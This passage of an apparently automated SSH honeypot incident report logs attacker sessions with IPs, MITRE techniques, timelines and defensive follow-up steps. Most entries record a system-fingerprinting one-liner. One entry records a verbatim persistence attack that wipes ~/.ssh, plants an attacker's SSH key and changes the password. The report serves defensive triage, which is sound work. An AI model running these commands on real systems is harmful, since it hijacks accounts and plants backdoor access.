| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:09:14` | `cowrie.session.connect` |
| `2026-07-08 19:09:14` | `cowrie.client.version` |
| `2026-07-08 19:09:14` | `cowrie.client.kex` |
| `2026-07-08 19:09:16` | `cowrie.login.success` |
| `2026-07-08 19:09:17` | `cowrie.session.params` |
| `2026-07-08 19:09:17` | `cowrie.command.input` |
| `2026-07-08 19:09:17` | `cowrie.command.input` |
| `2026-07-08 19:09:17` | `cowrie.command.input` |
| `2026-07-08 19:09:17` | `cowrie.command.input` |
| `2026-07-08 19:09:17` | `cowrie.command.input` |
| `2026-07-08 19:09:17` | `cowrie.command.success` |
| `2026-07-08 19:09:17` | `cowrie.command.input` |
| `2026-07-08 19:09:17` | `cowrie.command.input` |
| `2026-07-08 19:09:17` | `cowrie.command.input` |
| `2026-07-08 19:09:17` | `cowrie.command.input` |
| `2026-07-08 19:09:18` | `cowrie.log.closed` |
| `2026-07-08 19:09:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ba366f2c78f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:11 |
| **Last Seen** | 2026-07-08 19:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:11:35` | `cowrie.session.connect` |
| `2026-07-08 19:11:35` | `cowrie.client.version` |
| `2026-07-08 19:11:35` | `cowrie.client.kex` |
| `2026-07-08 19:11:37` | `cowrie.login.success` |
| `2026-07-08 19:11:38` | `cowrie.session.params` |
| `2026-07-08 19:11:38` | `cowrie.command.input` |
| `2026-07-08 19:11:38` | `cowrie.command.input` |
| `2026-07-08 19:11:38` | `cowrie.command.input` |
| `2026-07-08 19:11:38` | `cowrie.command.input` |
| `2026-07-08 19:11:38` | `cowrie.command.input` |
| `2026-07-08 19:11:38` | `cowrie.command.success` |
| `2026-07-08 19:11:38` | `cowrie.command.input` |
| `2026-07-08 19:11:38` | `cowrie.command.input` |
| `2026-07-08 19:11:38` | `cowrie.command.input` |
| `2026-07-08 19:11:38` | `cowrie.command.input` |
| `2026-07-08 19:11:39` | `cowrie.log.closed` |
| `2026-07-08 19:11:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a119d64de3b8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:11 |
| **Last Seen** | 2026-07-08 19:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:11:38` | `cowrie.session.connect` |
| `2026-07-08 19:11:38` | `cowrie.client.version` |
| `2026-07-08 19:11:38` | `cowrie.client.kex` |
| `2026-07-08 19:11:40` | `cowrie.login.success` |
| `2026-07-08 19:11:41` | `cowrie.session.params` |
| `2026-07-08 19:11:41` | `cowrie.command.input` |
| `2026-07-08 19:11:41` | `cowrie.command.input` |
| `2026-07-08 19:11:41` | `cowrie.command.input` |
| `2026-07-08 19:11:41` | `cowrie.command.input` |
| `2026-07-08 19:11:41` | `cowrie.command.input` |
| `2026-07-08 19:11:41` | `cowrie.command.success` |
| `2026-07-08 19:11:41` | `cowrie.command.input` |
| `2026-07-08 19:11:41` | `cowrie.command.input` |
| `2026-07-08 19:11:41` | `cowrie.command.input` |
| `2026-07-08 19:11:41` | `cowrie.command.input` |
| `2026-07-08 19:11:41` | `cowrie.log.closed` |
| `2026-07-08 19:11:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a0a47f48296

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 19:12 |
| **Last Seen** | 2026-07-08 19:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:12:44` | `cowrie.session.connect` |
| `2026-07-08 19:12:44` | `cowrie.client.version` |
| `2026-07-08 19:12:44` | `cowrie.client.kex` |
| `2026-07-08 19:12:45` | `cowrie.login.success` |
| `2026-07-08 19:12:45` | `cowrie.session.params` |
| `2026-07-08 19:12:45` | `cowrie.command.input` |
| `2026-07-08 19:12:46` | `cowrie.log.closed` |
| `2026-07-08 19:12:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b8f04cd789f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:13 |
| **Last Seen** | 2026-07-08 19:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:13:45` | `cowrie.session.connect` |
| `2026-07-08 19:13:46` | `cowrie.client.version` |
| `2026-07-08 19:13:46` | `cowrie.client.kex` |
| `2026-07-08 19:13:47` | `cowrie.login.success` |
| `2026-07-08 19:13:48` | `cowrie.session.params` |
| `2026-07-08 19:13:48` | `cowrie.command.input` |
| `2026-07-08 19:13:48` | `cowrie.command.input` |
| `2026-07-08 19:13:48` | `cowrie.command.input` |
| `2026-07-08 19:13:48` | `cowrie.command.input` |
| `2026-07-08 19:13:48` | `cowrie.command.input` |
| `2026-07-08 19:13:48` | `cowrie.command.success` |
| `2026-07-08 19:13:48` | `cowrie.command.input` |
| `2026-07-08 19:13:48` | `cowrie.command.input` |
| `2026-07-08 19:13:48` | `cowrie.command.input` |
| `2026-07-08 19:13:48` | `cowrie.command.input` |
| `2026-07-08 19:13:49` | `cowrie.log.closed` |
| `2026-07-08 19:13:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25387707487a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:13 |
| **Last Seen** | 2026-07-08 19:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:13:54` | `cowrie.session.connect` |
| `2026-07-08 19:13:55` | `cowrie.client.version` |
| `2026-07-08 19:13:55` | `cowrie.client.kex` |
| `2026-07-08 19:13:56` | `cowrie.login.success` |
| `2026-07-08 19:13:57` | `cowrie.session.params` |
| `2026-07-08 19:13:57` | `cowrie.command.input` |
| `2026-07-08 19:13:57` | `cowrie.command.input` |
| `2026-07-08 19:13:57` | `cowrie.command.input` |
| `2026-07-08 19:13:57` | `cowrie.command.input` |
| `2026-07-08 19:13:57` | `cowrie.command.input` |
| `2026-07-08 19:13:57` | `cowrie.command.success` |
| `2026-07-08 19:13:57` | `cowrie.command.input` |
| `2026-07-08 19:13:57` | `cowrie.command.input` |
| `2026-07-08 19:13:57` | `cowrie.command.input` |
| `2026-07-08 19:13:57` | `cowrie.command.input` |
| `2026-07-08 19:13:58` | `cowrie.log.closed` |
| `2026-07-08 19:13:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55e500aa8eae

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-08 19:14 |
| **Last Seen** | 2026-07-08 19:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:14:39` | `cowrie.session.connect` |
| `2026-07-08 19:14:39` | `cowrie.client.version` |
| `2026-07-08 19:14:39` | `cowrie.client.kex` |
| `2026-07-08 19:14:39` | `cowrie.login.success` |
| `2026-07-08 19:14:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f10ab796cf56

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-08 19:14 |
| **Last Seen** | 2026-07-08 19:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:14:39` | `cowrie.session.connect` |
| `2026-07-08 19:14:39` | `cowrie.client.version` |
| `2026-07-08 19:14:39` | `cowrie.client.kex` |
| `2026-07-08 19:14:39` | `cowrie.login.success` |
| `2026-07-08 19:14:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f12e90460745

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:15 |
| **Last Seen** | 2026-07-08 19:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:15:51` | `cowrie.session.connect` |
| `2026-07-08 19:15:52` | `cowrie.client.version` |
| `2026-07-08 19:15:52` | `cowrie.client.kex` |
| `2026-07-08 19:15:53` | `cowrie.login.success` |
| `2026-07-08 19:15:55` | `cowrie.session.params` |
| `2026-07-08 19:15:55` | `cowrie.command.input` |
| `2026-07-08 19:15:55` | `cowrie.command.input` |
| `2026-07-08 19:15:55` | `cowrie.command.input` |
| `2026-07-08 19:15:55` | `cowrie.command.input` |
| `2026-07-08 19:15:55` | `cowrie.command.input` |
| `2026-07-08 19:15:55` | `cowrie.command.success` |
| `2026-07-08 19:15:55` | `cowrie.command.input` |
| `2026-07-08 19:15:55` | `cowrie.command.input` |
| `2026-07-08 19:15:55` | `cowrie.command.input` |
| `2026-07-08 19:15:55` | `cowrie.command.input` |
| `2026-07-08 19:15:56` | `cowrie.log.closed` |
| `2026-07-08 19:15:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc30a3a945ea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:16 |
| **Last Seen** | 2026-07-08 19:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:16:13` | `cowrie.session.connect` |
| `2026-07-08 19:16:13` | `cowrie.client.version` |
| `2026-07-08 19:16:13` | `cowrie.client.kex` |
| `2026-07-08 19:16:15` | `cowrie.login.success` |
| `2026-07-08 19:16:16` | `cowrie.session.params` |
| `2026-07-08 19:16:16` | `cowrie.command.input` |
| `2026-07-08 19:16:16` | `cowrie.command.input` |
| `2026-07-08 19:16:16` | `cowrie.command.input` |
| `2026-07-08 19:16:16` | `cowrie.command.input` |
| `2026-07-08 19:16:16` | `cowrie.command.input` |
| `2026-07-08 19:16:16` | `cowrie.command.success` |
| `2026-07-08 19:16:16` | `cowrie.command.input` |
| `2026-07-08 19:16:16` | `cowrie.command.input` |
| `2026-07-08 19:16:16` | `cowrie.command.input` |
| `2026-07-08 19:16:16` | `cowrie.command.input` |
| `2026-07-08 19:16:17` | `cowrie.log.closed` |
| `2026-07-08 19:16:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89c359d982ec

| Field | Detail |
|---|---|
| **Source IP** | `106.12.108[.]64` |
| **First Seen** | 2026-07-08 19:16 |
| **Last Seen** | 2026-07-08 19:17 |
| **Session Duration** | 52s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "paper\nHpSKMJzdCtZM\nHpSKMJzdCtZM"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:16:40` | `cowrie.session.connect` |
| `2026-07-08 19:16:40` | `cowrie.client.version` |
| `2026-07-08 19:16:40` | `cowrie.client.kex` |
| `2026-07-08 19:16:41` | `cowrie.login.success` |
| `2026-07-08 19:16:42` | `cowrie.session.params` |
| `2026-07-08 19:16:42` | `cowrie.command.input` |
| `2026-07-08 19:16:42` | `cowrie.command.failed` |
| `2026-07-08 19:16:43` | `cowrie.log.closed` |
| `2026-07-08 19:16:43` | `cowrie.session.params` |
| `2026-07-08 19:16:43` | `cowrie.command.input` |
| `2026-07-08 19:16:44` | `cowrie.session.file_download` |
| `2026-07-08 19:16:44` | `cowrie.log.closed` |
| `2026-07-08 19:17:13` | `cowrie.session.params` |
| `2026-07-08 19:17:13` | `cowrie.command.input` |
| `2026-07-08 19:17:13` | `cowrie.log.closed` |
| `2026-07-08 19:17:14` | `cowrie.session.params` |
| `2026-07-08 19:17:14` | `cowrie.command.input` |
| `2026-07-08 19:17:14` | `cowrie.command.input` |
| `2026-07-08 19:17:14` | `cowrie.command.failed` |
| `2026-07-08 19:17:14` | `cowrie.log.closed` |
| `2026-07-08 19:17:15` | `cowrie.session.params` |
| `2026-07-08 19:17:15` | `cowrie.command.input` |
| `2026-07-08 19:17:16` | `cowrie.log.closed` |
| `2026-07-08 19:17:16` | `cowrie.session.params` |
| `2026-07-08 19:17:16` | `cowrie.command.input` |
| `2026-07-08 19:17:17` | `cowrie.log.closed` |
| `2026-07-08 19:17:18` | `cowrie.session.params` |
| `2026-07-08 19:17:18` | `cowrie.command.input` |
| `2026-07-08 19:17:18` | `cowrie.log.closed` |
| `2026-07-08 19:17:19` | `cowrie.session.params` |
| `2026-07-08 19:17:19` | `cowrie.command.input` |
| `2026-07-08 19:17:19` | `cowrie.command.input` |
| `2026-07-08 19:17:20` | `cowrie.log.closed` |
| `2026-07-08 19:17:20` | `cowrie.session.params` |
| `2026-07-08 19:17:20` | `cowrie.command.input` |
| `2026-07-08 19:17:21` | `cowrie.log.closed` |
| `2026-07-08 19:17:22` | `cowrie.session.params` |
| `2026-07-08 19:17:22` | `cowrie.command.input` |
| `2026-07-08 19:17:22` | `cowrie.log.closed` |
| `2026-07-08 19:17:23` | `cowrie.session.params` |
| `2026-07-08 19:17:23` | `cowrie.command.input` |
| `2026-07-08 19:17:23` | `cowrie.log.closed` |
| `2026-07-08 19:17:24` | `cowrie.session.params` |
| `2026-07-08 19:17:24` | `cowrie.command.input` |
| `2026-07-08 19:17:25` | `cowrie.log.closed` |
| `2026-07-08 19:17:26` | `cowrie.session.params` |
| `2026-07-08 19:17:26` | `cowrie.command.input` |
| `2026-07-08 19:17:26` | `cowrie.log.closed` |
| `2026-07-08 19:17:27` | `cowrie.session.params` |
| `2026-07-08 19:17:27` | `cowrie.command.input` |
| `2026-07-08 19:17:27` | `cowrie.log.closed` |
| `2026-07-08 19:17:28` | `cowrie.session.params` |
| `2026-07-08 19:17:28` | `cowrie.command.input` |
| `2026-07-08 19:17:29` | `cowrie.log.closed` |
| `2026-07-08 19:17:29` | `cowrie.session.params` |
| `2026-07-08 19:17:29` | `cowrie.command.input` |
| `2026-07-08 19:17:30` | `cowrie.log.closed` |
| `2026-07-08 19:17:31` | `cowrie.session.params` |
| `2026-07-08 19:17:31` | `cowrie.command.input` |
| `2026-07-08 19:17:31` | `cowrie.log.closed` |
| `2026-07-08 19:17:32` | `cowrie.session.params` |
| `2026-07-08 19:17:32` | `cowrie.command.input` |
| `2026-07-08 19:17:32` | `cowrie.log.closed` |
| `2026-07-08 19:17:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.12.108[.]64` to AbuseIPDB if not already reported
- [ ] Block `106.12.108[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cabf8c2514a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 19:17 |
| **Last Seen** | 2026-07-08 19:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:17:42` | `cowrie.session.connect` |
| `2026-07-08 19:17:43` | `cowrie.client.version` |
| `2026-07-08 19:17:43` | `cowrie.client.kex` |
| `2026-07-08 19:17:48` | `cowrie.login.success` |
| `2026-07-08 19:17:51` | `cowrie.session.params` |
| `2026-07-08 19:17:51` | `cowrie.command.input` |
| `2026-07-08 19:17:52` | `cowrie.log.closed` |
| `2026-07-08 19:17:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f8160774437

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:17 |
| **Last Seen** | 2026-07-08 19:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:17:57` | `cowrie.session.connect` |
| `2026-07-08 19:17:57` | `cowrie.client.version` |
| `2026-07-08 19:17:57` | `cowrie.client.kex` |
| `2026-07-08 19:17:59` | `cowrie.login.success` |
| `2026-07-08 19:18:00` | `cowrie.session.params` |
| `2026-07-08 19:18:00` | `cowrie.command.input` |
| `2026-07-08 19:18:00` | `cowrie.command.input` |
| `2026-07-08 19:18:00` | `cowrie.command.input` |
| `2026-07-08 19:18:00` | `cowrie.command.input` |
| `2026-07-08 19:18:00` | `cowrie.command.input` |
| `2026-07-08 19:18:00` | `cowrie.command.success` |
| `2026-07-08 19:18:00` | `cowrie.command.input` |
| `2026-07-08 19:18:00` | `cowrie.command.input` |
| `2026-07-08 19:18:00` | `cowrie.command.input` |
| `2026-07-08 19:18:00` | `cowrie.command.input` |
| `2026-07-08 19:18:00` | `cowrie.log.closed` |
| `2026-07-08 19:18:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27151446afac

| Field | Detail |
|---|---|
| **Source IP** | `120.48.122[.]158` |
| **First Seen** | 2026-07-08 19:18 |
| **Last Seen** | 2026-07-08 19:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
